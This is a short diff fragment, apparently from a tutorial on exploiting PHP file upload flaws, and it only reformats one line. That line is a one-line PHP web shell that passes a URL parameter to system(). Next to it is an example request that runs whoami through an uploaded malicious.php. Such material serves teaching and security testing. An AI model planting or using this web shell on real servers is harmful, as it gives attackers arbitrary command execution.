@@ -38,7 +38,7 @@ echo $output;
 Or you can upload your own malicious file and use that to run your own commands.
 
 Malicious.php
-    <?php system($_GET['cmd']); ?>
+   - <?php system($_GET['cmd']); ?>
 
 `example.com/uploads/malicious.php?cmd=whoami`
 
